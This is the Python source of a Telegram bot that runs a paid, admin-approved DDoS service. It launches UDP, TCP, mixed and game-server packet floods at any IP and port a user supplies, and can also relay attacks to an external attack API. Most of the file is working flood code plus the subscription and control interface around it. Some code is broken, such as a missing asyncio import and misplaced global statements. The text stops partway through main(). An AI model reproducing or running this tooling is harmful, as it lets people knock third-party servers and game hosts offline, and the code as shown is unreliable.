import logging
import sys
import re
import uuid
import socket
import threading
import time
import random
from datetime import datetime, timedelta, timezone
from typing import Dict, Optional, List
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ConversationHandler,
    ContextTypes,
    MessageHandler,
    filters
)
import pymongo
from pymongo import MongoClient, ASCENDING, DESCENDING
import os
from dotenv import load_dotenv

logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)
load_dotenv()

# ---------- CONFIG ----------
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGODB_URI = os.getenv("MONGODB_URI")
DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")

admin_env = os.getenv("ADMIN_IDS", "8210011971").strip()
if admin_env.startswith('"') and admin_env.endswith('"'):
    admin_env = admin_env[1:-1]
ADMIN_IDS = [int(x.strip()) for x in admin_env.split(",") if x.strip().isdigit()]
if not ADMIN_IDS:
    ADMIN_IDS = [8210011971]

if not BOT_TOKEN or not MONGODB_URI:
    print("❌ Missing BOT_TOKEN or MONGODB_URI")
    sys.exit(1)

BLOCKED_PORTS = {443, 8700, 9031, 17500, 20000, 20001, 20002}
MIN_PORT, MAX_PORT = 1, 65535
APPROVE_USER, APPROVE_DAYS = 1, 2
DISAPPROVE_USER = 3
SETAPI_URL, SETAPI_KEY = 4, 5

# ============ ATTACK ENGINE SETTINGS ============
ATTACK_THREADS = 150
SOCKETS_PER_THREAD = 20
ATTACK_DELAY = 0.00001
PACKET_SIZE = 1024

# Global attack state
attack_running = False
attack_stats = {'packets': 0, 'target': '', 'port': 0, 'method': '', 'start': 0, 'duration': 0}
stats_lock = threading.Lock()
active_attack_threads = []

# ============ TIME HELPERS ============
def make_aware(dt):
    if dt and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

# ============ DATABASE ============
class Database:
    def __init__(self):
        self.client = MongoClient(MONGODB_URI)
        self.db = self.client[DATABASE_NAME]
        self.users = self.db.users
        self.attacks = self.db.attacks
        self.settings = self.db.settings
        self.users.delete_many({"user_id": None})
        self.users.delete_many({"user_id": {"$exists": False}})
        self.attacks.create_index([("timestamp", DESCENDING)])
        self.attacks.create_index([("user_id", ASCENDING)])
        self.users.create_index([("user_id", ASCENDING)], unique=True, sparse=True)
        if not self.settings.find_one({"_id": "api_config"}):
            self.settings.insert_one({"_id": "api_config", "api_url": "", "api_key": ""})
    
    def get_user(self, user_id: int):
        user = self.users.find_one({"user_id": user_id})
        if user:
            for f in ["created_at","approved_at","expires_at"]:
                if user.get(f):
                    user[f] = make_aware(user[f])
        return user
    
    def create_user(self, user_id: int, username: str = None):
        if self.get_user(user_id):
            return
        self.users.insert_one({
            "user_id": user_id, "username": username, "approved": False,
            "approved_at": None, "expires_at": None, "total_attacks": 0,
            "created_at": get_current_time(), "is_banned": False
        })
    
    def approve_user(self, user_id: int, days: int) -> bool:
        exp = get_current_time() + timedelta(days=days)
        res = self.users.update_one({"user_id": user_id}, {"$set": {"approved": True, "approved_at": get_current_time(), "expires_at": exp}})
        return res.modified_count > 0
    
    def disapprove_user(self, user_id: int) -> bool:
        res = self.users.update_one({"user_id": user_id}, {"$set": {"approved": False, "expires_at": None}})
        return res.modified_count > 0
    
    def log_attack(self, user_id: int, ip: str, port: int, duration: int, status: str, packets: int = 0, method: str = ""):
        self.attacks.insert_one({"_id": str(uuid.uuid4()), "user_id": user_id, "ip": ip, "port": port,
                                 "duration": duration, "status": status, "packets": packets, "method": method,
                                 "timestamp": get_current_time()})
        self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
    
    def get_all_users(self):
        users = list(self.users.find({"user_id": {"$ne": None}}))
        for u in users:
            for f in ["created_at","approved_at","expires_at"]:
                if u.get(f): u[f] = make_aware(u[f])
            if "total_attacks" not in u: u["total_attacks"] = 0
        return users
    
    def get_user_stats(self, user_id: int):
        total = self.attacks.count_documents({"user_id": user_id})
        success = self.attacks.count_documents({"user_id": user_id, "status": "success"})
        failed = self.attacks.count_documents({"user_id": user_id, "status": "failed"})
        recent = list(self.attacks.find({"user_id": user_id}).sort("timestamp", -1).limit(10))
        for a in recent:
            if a.get("timestamp"): a["timestamp"] = make_aware(a["timestamp"])
        return {"total": total, "successful": success, "failed": failed, "recent": recent}
    
    def get_api_config(self):
        doc = self.settings.find_one({"_id": "api_config"})
        return doc.get("api_url", ""), doc.get("api_key", "")
    
    def set_api_config(self, url: str, key: str):
        self.settings.update_one({"_id": "api_config"}, {"$set": {"api_url": url, "api_key": key}}, upsert=True)

print("📦 Connecting to MongoDB...")
db = Database()
print("✅ Database ready")

def is_port_blocked(p): return p in BLOCKED_PORTS
def blocked_ports_str(): return ", ".join(str(p) for p in sorted(BLOCKED_PORTS))

async def is_approved(uid):
    user = db.get_user(uid)
    if not user or not user.get("approved"): return False
    exp = user.get("expires_at")
    if exp and make_aware(exp) < get_current_time(): return False
    return True

# ============ REAL ATTACK ENGINE ============
def g_flood(ip, port):
    global attack_running, attack_stats
    socks = []
    for _ in range(SOCKETS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            socks.append(s)
        except:
            pass
    payload = ('G' * PACKET_SIZE).encode('utf-8')
    while attack_running:
        for sock in socks:
            try:
                sock.sendto(payload, (ip, port))
                with stats_lock:
                    attack_stats['packets'] += 1
            except:
                pass
        time.sleep(ATTACK_DELAY)
    for sock in socks:
        sock.close()

def udp_flood(ip, port):
    global attack_running, attack_stats
    socks = []
    for _ in range(SOCKETS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            socks.append(s)
        except:
            pass
    payload = random._urandom(PACKET_SIZE)
    while attack_running:
        for sock in socks:
            try:
                sock.sendto(payload, (ip, port))
                with stats_lock:
                    attack_stats['packets'] += 1
            except:
                pass
        time.sleep(ATTACK_DELAY)
    for sock in socks:
        sock.close()

def tcp_flood(ip, port):
    global attack_running, attack_stats
    while attack_running:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.001)
            s.connect_ex((ip, port))
            s.close()
            with stats_lock:
                attack_stats['packets'] += 1
            time.sleep(0.0001)
        except:
            time.sleep(0.001)

def mixed_flood(ip, port):
    global attack_running, attack_stats
    udp_socks = []
    for _ in range(SOCKETS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            udp_socks.append(s)
        except:
            pass
    payload = random._urandom(PACKET_SIZE)
    while attack_running:
        for sock in udp_socks:
            try:
                sock.sendto(payload, (ip, port))
                with stats_lock:
                    attack_stats['packets'] += 1
            except:
                pass
        try:
            tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            tcp.settimeout(0.0005)
            tcp.connect_ex((ip, port))
            tcp.close()
            with stats_lock:
                attack_stats['packets'] += 1
        except:
            pass
        time.sleep(ATTACK_DELAY)
    for sock in udp_socks:
        sock.close()

def game_killer_flood(ip, port):
    global attack_running, attack_stats
    socks = []
    for _ in range(SOCKETS_PER_THREAD):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            socks.append(s)
        except:
            pass
    payloads = [
        b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00',
        ('G' * 1024).encode('utf-8'),
        random._urandom(1024),
        b'\x00' * 1024,
        b'\xff' * 1024
    ]
    while attack_running:
        for payload in payloads:
            for sock in socks:
                try:
                    sock.sendto(payload, (ip, port))
                    with stats_lock:
                        attack_stats['packets'] += 1
                except:
                    pass
        time.sleep(ATTACK_DELAY * 0.8)
    for sock in socks:
        sock.close()

def start_real_attack(ip, port, duration, method, user_id, update_func):
    global attack_running, attack_stats, active_attack_threads
    
    attack_running = True
    with stats_lock:
        attack_stats = {
            'packets': 0,
            'target': ip,
            'port': port,
            'method': method,
            'start': time.time(),
            'duration': duration,
            'user_id': user_id
        }
    
    if method == 'gflood':
        attack_func = g_flood
    elif method == 'tcp':
        attack_func = tcp_flood
    elif method == 'game':
        attack_func = game_killer_flood
    elif method == 'mixed':
        attack_func = mixed_flood
    else:
        attack_func = udp_flood
    
    total_streams = ATTACK_THREADS * SOCKETS_PER_THREAD if method != 'tcp' else ATTACK_THREADS
    
    active_attack_threads = []
    for _ in range(ATTACK_THREADS):
        t = threading.Thread(target=attack_func, args=(ip, port), daemon=True)
        t.start()
        active_attack_threads.append(t)
    
    start_time = time.time()
    last_update = 0
    keyboard = [
        [InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")],
        [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")]
    ]
    
    update_func(
        f"💀 *FLOOD ATTACK STARTED* 💀\n\n🎯 `{ip}:{port}`\n⚙️ Method: `{method.upper()}`\n⏱️ Duration: `{duration}s`\n🧵 Threads: `{ATTACK_THREADS}`\n📡 Streams: `{total_streams}`\n\n_Sending flood packets..._",
        InlineKeyboardMarkup(keyboard)
    )
    
    while attack_running and (time.time() - start_time) < duration:
        time.sleep(1)
        if time.time() - last_update >= 2:
            last_update = time.time()
            elapsed = int(time.time() - start_time)
            remaining = duration - elapsed
            with stats_lock:
                pkt = attack_stats['packets']
            speed = int(pkt / elapsed) if elapsed > 0 else 0
            progress = int((elapsed / duration) * 20)
            bar = "█" * progress + "░" * (20 - progress)
            
            msg = (
                f"💀 *FLOOD IN PROGRESS* 💀\n\n"
                f"🎯 `{ip}:{port}` | `{method.upper()}`\n"
                f"📦 Packets: `{pkt:,}`\n"
                f"💥 Speed: `{speed:,}` pps\n"
                f"⏱️ Time: `{elapsed}/{duration}s`\n"
                f"📊 `[{bar}]`\n\n"
                f"🔘 *Control buttons*"
            )
            update_func(msg, InlineKeyboardMarkup(keyboard))
    
    attack_running = False
    for t in active_attack_threads:
        t.join(timeout=0.5)
    
    with stats_lock:
        pkt = attack_stats['packets']
    avg_speed = int(pkt / duration) if duration else 0
    
    db.log_attack(user_id, ip, port, duration, "success", pkt, method)
    
    update_func(
        f"✅ *FLOOD COMPLETED* ✅\n\n🎯 `{ip}:{port}`\n📦 Total Packets: `{pkt:,}`\n💥 Avg Speed: `{avg_speed:,}` pps\n⏱️ Duration: `{duration}s`",
        None
    )

# ============ API CALL (Backup) ============
def send_attack_api(ip: str, port: int, duration: int):
    try:
        api_url, api_key = db.get_api_config()
        if not api_url:
            return False, "❌ API URL not set. Admin use Admin Panel."
        if not api_key:
            return False, "❌ API Key missing."
        if not api_url.startswith(("http://", "https://")):
            api_url = "https://" + api_url
        params = {"ip": ip, "port": port, "duration": duration}
        headers = {"x-api-key": api_key}
        response = requests.get(api_url, params=params, headers=headers, timeout=15)
        if response.status_code == 200:
            return True, f"✅ Attack launched! HTTP {response.status_code}"
        else:
            return False, f"❌ API error (HTTP {response.status_code})"
    except Exception as e:
        return False, f"❌ API error: {str(e)[:100]}"

# ============ KEYBOARDS ============
def main_menu(is_admin: bool, approved: bool):
    keyboard = []
    if approved:
        keyboard.append([InlineKeyboardButton("🚀 Attack (API)", callback_data="attack_menu")])
        keyboard.append([InlineKeyboardButton("💀 Flood Attack (Real)", callback_data="attack_flood_menu")])
        keyboard.append([InlineKeyboardButton("📊 My Info", callback_data="myinfo"), InlineKeyboardButton("📈 My Stats", callback_data="mystats")])
        keyboard.append([InlineKeyboardButton("🚫 Blocked Ports", callback_data="blockedports")])
        keyboard.append([InlineKeyboardButton("❓ Help", callback_data="help")])
    else:
        keyboard.append([InlineKeyboardButton("❌ Access Denied", callback_data="no_access")])
        keyboard.append([InlineKeyboardButton("❓ Help", callback_data="help")])
    if is_admin:
        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel")])
    return InlineKeyboardMarkup(keyboard)

def admin_panel_kb():
    kb = [
        [InlineKeyboardButton("✅ Approve User", callback_data="admin_approve")],
        [InlineKeyboardButton("❌ Disapprove User", callback_data="admin_disapprove")],
        [InlineKeyboardButton("📋 List Users", callback_data="admin_users")],
        [InlineKeyboardButton("📊 Bot Stats", callback_data="admin_stats")],
        [InlineKeyboardButton("🔌 API Status", callback_data="admin_status")],
        [InlineKeyboardButton("🔧 Set API URL/Key", callback_data="admin_setapi")],
        [InlineKeyboardButton("⚙️ Attack Settings", callback_data="admin_attack_settings")],
        [InlineKeyboardButton("🚫 Blocked Ports", callback_data="admin_blockedports")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
    ]
    return InlineKeyboardMarkup(kb)

def attack_flood_kb():
    kb = [
        [InlineKeyboardButton("🇬 G-FLOOD (Your Method)", callback_data="flood_gflood")],
        [InlineKeyboardButton("🔥 UDP FLOOD", callback_data="flood_udp")],
        [InlineKeyboardButton("💣 TCP SYN FLOOD", callback_data="flood_tcp")],
        [InlineKeyboardButton("⚡ MIXED FLOOD", callback_data="flood_mixed")],
        [InlineKeyboardButton("🎮 GAME KILLER", callback_data="flood_game")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main")]
    ]
    return InlineKeyboardMarkup(kb)

def attack_back_kb():
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back_main")]])

# ============ HANDLERS ============
async def start_cmd(update, context):
    uid = update.effective_user.id
    name = update.effective_user.username
    db.create_user(uid, name)
    approved = await is_approved(uid)
    is_admin = uid in ADMIN_IDS
    if approved:
        exp = db.get_user(uid).get("expires_at")
        days = max(0, (make_aware(exp) - get_current_time()).days) if exp else 0
        text = f"✅ *Welcome {name or uid}!* Active for {days} days."
    else:
        text = f"❌ *Access Denied, {name or uid}!* Not approved."
    await update.message.reply_text(text, parse_mode="Markdown", reply_markup=main_menu(is_admin, approved))

async def button_handler(update, context):
    query = update.callback_query
    await query.answer()
    data = query.data
    uid = query.from_user.id
    is_admin = uid in ADMIN_IDS
    approved = await is_approved(uid)
    
    if data == "attack_menu":
        if not approved:
            await query.edit_message_text("Not approved.", reply_markup=main_menu(is_admin, False))
            return
        await query.edit_message_text(
            f"🚀 *API Attack*\nSend: `/attack IP PORT DURATION`\nExample: `/attack 1.2.3.4 80 60`\n\nBlocked ports: {blocked_ports_str()}",
            parse_mode="Markdown", reply_markup=attack_back_kb()
        )
    elif data == "attack_flood_menu":
        if not approved:
            await query.edit_message_text("Not approved.", reply_markup=main_menu(is_admin, False))
            return
        await query.edit_message_text(
            "💀 *REAL FLOOD ATTACK* 💀\n\nSelect method:\n• G-FLOOD - Pure 'G' characters\n• UDP FLOOD - Random UDP\n• TCP SYN FLOOD - Connection flood\n• MIXED FLOOD - UDP+TCP\n• GAME KILLER - BGMI/PUBG\n\n⚠️ *Massive packet flood!*",
            parse_mode="Markdown", reply_markup=attack_flood_kb()
        )
    elif data.startswith("flood_"):
        if not approved:
            await query.edit_message_text("Not approved.")
            return
        method = data.split("_")[1]
        context.user_data['flood_method'] = method
        await query.edit_message_text(
            f"🎯 *FLOOD: {method.upper()}*\n\nSend: `IP PORT DURATION`\nExample: `20.204.180.120 26855 60`\n\nBlocked ports: {blocked_ports_str()}",
            parse_mode="Markdown"
        )
    elif data == "myinfo":
        if not approved:
            await query.edit_message_text("Not approved.", reply_markup=main_menu(is_admin, False))
            return
        u = db.get_user(uid)
        if u.get("approved"):
            exp = u.get("expires_at")
            days = max(0, (make_aware(exp) - get_current_time()).days) if exp else 0
            txt = f"📋 *Your Info*\n🆔 `{uid}`\n✅ Approved\n⏰ Expires: {days} days\n🎯 Total attacks: {u.get('total_attacks',0)}"
        else:
            txt = "❌ Not approved."
        await query.edit_message_text(txt, parse_mode="Markdown", reply_markup=main_menu(is_admin, approved))
    elif data == "mystats":
        if not approved:
            await query.edit_message_text("Not approved.", reply_markup=main_menu(is_admin, False))
            return
        s = db.get_user_stats(uid)
        rate = (s['successful']/s['total']*100) if s['total']>0 else 0
        txt = f"📊 *Your Stats*\nTotal: {s['total']}\n✅ {s['successful']} | ❌ {s['failed']}\nSuccess: {rate:.1f}%"
        if s['recent']:
            txt += "\n\n*Recent:*\n"
            for a in s['recent'][:3]:
                ago = (get_current_time() - a['timestamp']).seconds // 60
                txt += f"{'✅' if a['status']=='success' else '❌'} `{a['ip']}:{a['port']}` - {a['duration']}s ({ago}m ago)\n"
        await query.edit_message_text(txt, parse_mode="Markdown", reply_markup=main_menu(is_admin, approved))
    elif data == "blockedports":
        txt = f"🚫 *Blocked ports*\n{blocked_ports_str()}"
        await query.edit_message_text(txt, parse_mode="Markdown", reply_markup=main_menu(is_admin, approved))
    elif data == "help":
        txt = "🤖 *Bot Help*\n• Attack (API) - External API\n• Flood Attack (Real) - Direct UDP/TCP flood\n• My Info - Account\n• My Stats - History"
        await query.edit_message_text(txt, parse_mode="Markdown", reply_markup=main_menu(is_admin, approved))
    elif data == "admin_panel":
        if not is_admin:
            await query.edit_message_text("Unauthorized.")
            return
        url, key = db.get_api_config()
        url_disp = url if url else "Not set"
        key_disp = (key[:10]+"...") if key else "Not set"
        await query.edit_message_text(
            f"👑 *Admin Panel*\n🔗 API URL: `{url_disp}`\n🔑 API Key: `{key_disp}`\n⚙️ Threads: `{ATTACK_THREADS}`",
            parse_mode="Markdown", reply_markup=admin_panel_kb()
        )
    elif data == "back_main":
        await query.edit_message_text("Main menu:", reply_markup=main_menu(is_admin, approved))
    elif data == "admin_users":
        if not is_admin: return
        users = db.get_all_users()
        if not users:
            txt = "No users."
        else:
            approved_cnt = sum(1 for u in users if u.get("approved"))
            txt = f"👥 Total: {len(users)} | ✅ Approved: {approved_cnt}\n\n"
            for u in users[:15]:
                txt += f"{'✅' if u.get('approved') else '⏳'} `{u['user_id']}` - {u.get('total_attacks',0)} attacks\n"
        await query.edit_message_text(txt, parse_mode="Markdown", reply_markup=admin_panel_kb())
    elif data == "admin_stats":
        if not is_admin: return
        users = db.get_all_users()
        total_atk = sum(u.get('total_attacks',0) for u in users)
        txt = f"📊 *Bot Stats*\n👥 Users: {len(users)}\n🎯 Total attacks: {total_atk}\n🚫 Blocked ports: {len(BLOCKED_PORTS)}\n⚙️ Threads: {ATTACK_THREADS}"
        await query.edit_message_text(txt, parse_mode="Markdown", reply_markup=admin_panel_kb())
    elif data == "admin_status":
        if not is_admin: return
        url, key = db.get_api_config()
        if not url:
            await query.edit_message_text("API URL not set.", reply_markup=admin_panel_kb())
            return
        await query.edit_message_text("🔍 Testing API...")
        try:
            test_url = url if url.startswith(("http://","https://")) else "https://"+url
            resp = requests.get(test_url, headers={"x-api-key": key}, timeout=10)
            status = f"✅ API responded (HTTP {resp.status_code})"
        except Exception as e:
            status = f"❌ Error: {str(e)[:100]}"
        await query.edit_message_text(status, reply_markup=admin_panel_kb())
    elif data == "admin_blockedports":
        if not is_admin: return
        await query.edit_message_text(f"🚫 Blocked ports: {blocked_ports_str()}", reply_markup=admin_panel_kb())
    elif data == "admin_attack_settings":
        if not is_admin: return
        kb = [
            [InlineKeyboardButton("⬆️ +10 Threads", callback_data="inc_threads")],
            [InlineKeyboardButton("⬇️ -10 Threads", callback_data="dec_threads")],
            [InlineKeyboardButton("🔙 Back", callback_data="admin_panel")]
        ]
        await query.edit_message_text(f"⚙️ *Settings*\nThreads: `{ATTACK_THREADS}`\nSockets/Thread: `{SOCKETS_PER_THREAD}`\nDelay: `{ATTACK_DELAY}`s", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))
    elif data == "inc_threads":
        global ATTACK_THREADS
        if ATTACK_THREADS + 10 <= 200:
            ATTACK_THREADS += 10
            await query.edit_message_text(f"✅ Threads: {ATTACK_THREADS}", reply_markup=admin_panel_kb())
        else:
            await query.answer("Max 200 threads!", show_alert=True)
    elif data == "dec_threads":
        global ATTACK_THREADS
        if ATTACK_THREADS - 10 >= 50:
            ATTACK_THREADS -= 10
            await query.edit_message_text(f"✅ Threads: {ATTACK_THREADS}", reply_markup=admin_panel_kb())
        else:
            await query.answer("Min 50 threads!", show_alert=True)
    elif data in ["stop_attack", "info_attack", "refresh_attack"]:
        global attack_running, attack_stats
        if data == "stop_attack":
            attack_running = False
            await query.edit_message_text("🛑 Stopped", parse_mode="Markdown")
        elif data == "info_attack" and attack_running:
            with stats_lock:
                pkt = attack_stats['packets']
                elapsed = int(time.time() - attack_stats['start'])
                remaining = attack_stats['duration'] - elapsed
                speed = int(pkt / elapsed) if elapsed else 0
            await query.edit_message_text(f"ℹ️ *Info*\n📦 Packets: `{pkt:,}`\n⏱️ Remaining: `{remaining}s`\n💥 Speed: `{speed:,}` pps", parse_mode="Markdown")
        elif data == "refresh_attack" and attack_running:
            with stats_lock:
                pkt = attack_stats['packets']
                elapsed = int(time.time() - attack_stats['start'])
                remaining = attack_stats['duration'] - elapsed
                speed = int(pkt / elapsed) if elapsed else 0
                progress = int((elapsed / attack_stats['duration']) * 20)
                bar = "█" * progress + "░" * (20 - progress)
            kb = [[InlineKeyboardButton("🛑 STOP", callback_data="stop_attack")], [InlineKeyboardButton("ℹ️ INFO", callback_data="info_attack"), InlineKeyboardButton("🔄 REFRESH", callback_data="refresh_attack")]]
            await query.edit_message_text(f"💀 *ACTIVE* 💀\n\n📦 `{pkt:,}` pkts\n💥 `{speed:,}` pps\n⏱️ `{elapsed}/{attack_stats['duration']}s`\n📊 `[{bar}]`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(kb))
        else:
            await query.answer("No active attack")
    elif data == "admin_setapi":
        if not is_admin: return
        await query.edit_message_text("🔧 Send API URL (or /cancel):")
        return SETAPI_URL
    elif data == "admin_approve":
        if not is_admin: return
        await query.edit_message_text("📝 Send user ID:")
        return APPROVE_USER
    elif data == "admin_disapprove":
        if not is_admin: return
        await query.edit_message_text("❌ Send user ID:")
        return DISAPPROVE_USER
    return ConversationHandler.END

async def handle_flood_input(update, context):
    uid = update.effective_user.id
    if not await is_approved(uid):
        await update.message.reply_text("❌ Not approved")
        return
    
    method = context.user_data.get('flood_method')
    if not method:
        await update.message.reply_text("❌ Select method from menu first.")
        return
    
    text = update.message.text.strip()
    parts = text.split()
    if len(parts) != 3:
        await update.message.reply_text("❌ Format: `IP PORT DURATION`\nExample: `20.204.180.120 26855 60`", parse_mode="Markdown")
        return
    
    ip, port_str, dur_str = parts
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        await update.message.reply_text("❌ Invalid IP")
        return
    
    try:
        port = int(port_str)
        duration = int(dur_str)
        if port < 1 or port > 65535 or is_port_blocked(port) or duration < 5 or duration > 300:
            raise ValueError
    except:
        await update.message.reply_text(f"❌ Invalid port (1-65535, not blocked) or duration (5-300s)")
        return
    
    context.user_data.pop('flood_method', None)
    
    msg = await update.message.reply_text(f"💀 Starting {method.upper()} flood on {ip}:{port} for {duration}s...")
    
    loop = asyncio.get_event_loop()
    def update_func(text, reply_markup=None):
        asyncio.run_coroutine_threadsafe(msg.edit_text(text, parse_mode="Markdown", reply_markup=reply_markup), loop)
    
    threading.Thread(target=start_real_attack, args=(ip, port, duration, method, uid, update_func), daemon=True).start()

# API Attack Command
async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await is_approved(uid):
        await update.message.reply_text("❌ Not approved")
        return
    args = context.args
    if len(args) != 3:
        await update.message.reply_text(f"❌ Usage: /attack <IP> <PORT> <DURATION>\nBlocked: {blocked_ports_str()}")
        return
    ip, port_str, dur_str = args
    if not re.match(r'^(\d{1,3}\.){3}\d{1,3}$', ip):
        await update.message.reply_text("❌ Invalid IP")
        return
    try:
        port = int(port_str)
        duration = int(dur_str)
        if port < 1 or port > 65535 or is_port_blocked(port) or duration < 1 or duration > 300:
            raise ValueError
    except:
        await update.message.reply_text("❌ Invalid port or duration")
        return
    status_msg = await update.message.reply_text(f"🚀 Launching API attack on {ip}:{port}...")
    success, message = send_attack_api(ip, port, duration)
    db.log_attack(uid, ip, port, duration, "success" if success else "failed", 0, "api")
    await status_msg.edit_text(message, parse_mode="Markdown")

async def myinfo_cmd(update, context):
    uid = update.effective_user.id
    u = db.get_user(uid)
    if not u:
        await update.message.reply_text("Use /start first.")
        return
    if u.get("approved"):
        exp = u.get("expires_at")
        days = max(0, (make_aware(exp) - get_current_time()).days) if exp else 0
        txt = f"✅ Approved\nUser: {uid}\nExpires: {days} days\nAttacks: {u.get('total_attacks',0)}"
    else:
        txt = "❌ Not approved."
    await update.message.reply_text(txt)

async def mystats_cmd(update, context):
    uid = update.effective_user.id
    if not await is_approved(uid):
        await update.message.reply_text("Not approved.")
        return
    s = db.get_user_stats(uid)
    rate = (s['successful']/s['total']*100) if s['total']>0 else 0
    txt = f"📊 *Your Stats*\nTotal: {s['total']}\n✅ {s['successful']} | ❌ {s['failed']}\nSuccess: {rate:.1f}%"
    await update.message.reply_text(txt, parse_mode="Markdown")

async def blocked_ports_cmd(update, context):
    await update.message.reply_text(f"🚫 Blocked ports: {blocked_ports_str()}")

async def help_cmd(update, context):
    await update.message.reply_text(
        "🤖 *Bot Help*\n\n"
        "• /start - Main menu\n"
        "• /attack IP PORT DURATION - API attack\n"
        "• /myinfo - Your account info\n"
        "• /mystats - Your attack statistics\n"
        "• /blockedports - Show blocked ports\n\n"
        "💀 *Real Flood Attack* available in main menu!",
        parse_mode="Markdown"
    )

async def setapi_url(update, context):
    url = update.message.text.strip()
    if not url.startswith(("http://","https://")):
        url = "https://" + url
    context.user_data['api_url'] = url
    await update.message.reply_text("Now send API Key (or /cancel):")
    return SETAPI_KEY

async def setapi_key(update, context):
    key = update.message.text.strip()
    url = context.user_data.get('api_url')
    if url and key:
        db.set_api_config(url, key)
        await update.message.reply_text(f"✅ API configured!\nURL: {url}\nKey: {key[:10]}...")
    else:
        await update.message.reply_text("❌ Invalid. Cancelled.")
    context.user_data.clear()
    return ConversationHandler.END

async def approve_uid(update, context):
    txt = update.message.text.strip()
    if not txt.isdigit():
        await update.message.reply_text("Invalid user ID. Send /cancel")
        return APPROVE_USER
    context.user_data['approve_uid'] = int(txt)
    await update.message.reply_text("Enter number of days:")
    return APPROVE_DAYS

async def approve_days(update, context):
    days = update.message.text.strip()
    if not days.isdigit():
        await update.message.reply_text("Invalid days. /cancel")
        return APPROVE_DAYS
    uid = context.user_data.get('approve_uid')
    days = int(days)
    if db.approve_user(uid, days):
        await update.message.reply_text(f"✅ User {uid} approved for {days} days.")
        try:
            await context.bot.send_message(uid, f"✅ Your account approved for {days} days!")
        except:
            pass
    else:
        await update.message.reply_text("❌ Approval failed.")
    context.user_data.clear()
    return ConversationHandler.END

async def disapprove_uid(update, context):
    txt = update.message.text.strip()
    if not txt.isdigit():
        await update.message.reply_text("Invalid. /cancel")
        return DISAPPROVE_USER
    uid = int(txt)
    if db.disapprove_user(uid):
        await update.message.reply_text(f"✅ User {uid} disapproved.")
        try:
            await context.bot.send_message(uid, "❌ Your access has been revoked.")
        except:
            pass
    else:
        await update.message.reply_text("❌ Failed.")
    context.user_data.clear()
    return ConversationHandler.END

async def cancel_conv(update, context):
    context.user_data.clear()
    await update.message.reply_text("Cancelled.")
    return ConversationHandler.END

async def error_handler(update, context):
    logger.error(f"Error: {context.error}")
    if update and update.effective_message:
        await update.effective_message.reply_text("❌ An error occurred. Please try again.")

# ============ MAIN FUNCTION ============
def main():
    print("=" * 60)
    print("🤖 Starting DDoS Bot...")
    print(f"👑 Admins: {ADMIN_IDS}")
    print(f"⚙️ Attack Threads: {ATTACK_THREADS}")
    print(f"🔌 Sockets per thread: {SOCKETS_PER_THREAD}")
    print("=" * 60)
    
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Conversation handlers
    setapi_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern="^admin_setapi$")],
        states={
            SETAPI_URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setapi_url)],
            SETAPI_KEY: [MessageHandler(filters.TEXT & ~filters.COMMAND, setapi_key)]
        },
        fallbacks=[CommandHandler("cancel", cancel_conv)],
    )
    
    approve_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern="^admin_approve$")],
        states={
            APPROVE_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, approve_uid)],
            APPROVE_DAYS: [MessageHandler(filters.TEXT & ~filters.COMMAND, approve_days)]
        },
        fallbacks=[CommandHandler("cancel", cancel_conv)],
    )
    
    disapprove_conv = ConversationHandler(
        entry_points=[CallbackQueryHandler(button_handler, pattern="^admin_disapprove$")],
        states={
            DISAPPROVE_USER: [MessageHandler(filters.TEXT & ~filters.COMMAND, disapprove_uid)]
        },
        fallbacks=[CommandHandler("cancel", cancel_conv)],
    )
    
    # Command handlers
    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("attack", attack_cmd))
    app.add_handler(CommandHandler("myinfo", myinfo_cmd))
    app.add_handler(CommandHandler("mystats", mystats_cmd))
    app.add_handler(CommandHandler("blockedports", blocked_ports_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    
    # Callback handlers
    app.add_handler(CallbackQueryHandler(button_handler, pattern="^(attack_menu|attack_flood_menu|flood_|myinfo|mystats|blockedports|help|admin_panel|back_main|admin_users|admin_stats|admin_status|admin_blockedports|admin_attack_settings|inc_threads|dec_threads|stop_attack|info_attack|refresh_attack)$"))
    
    # Conversation handlers
    app.add_handler(setapi_conv)
    app.add_handler(approve_conv)
    app.add_handler(disapprove_conv)
    
    # Message handler for flood input
